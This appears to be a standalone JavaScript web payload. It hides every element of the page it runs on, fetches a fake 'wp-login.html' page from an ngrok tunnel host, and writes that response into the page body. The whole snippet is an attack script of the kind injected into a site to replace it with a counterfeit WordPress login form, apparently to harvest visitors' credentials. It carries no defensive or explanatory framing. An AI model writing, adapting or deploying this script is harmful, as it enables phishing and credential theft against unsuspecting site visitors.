// Get all web elements
const elements = document.getElementsByTagName('*');

const body = document.body;
body.style.display = 'none';  

// Loop through all elements and hide them
for (let i = 0; i < elements.length; i++) {
    elements[i].style.display = 'none';
}

// load a remote web page
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://xxxxxx.ngrok.app/wp-login.html', true);
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
        // Get the response and inject it into the page
        const response = xhr.responseText;
        document.body.innerHTML = response;
    }
};
xhr.send(null);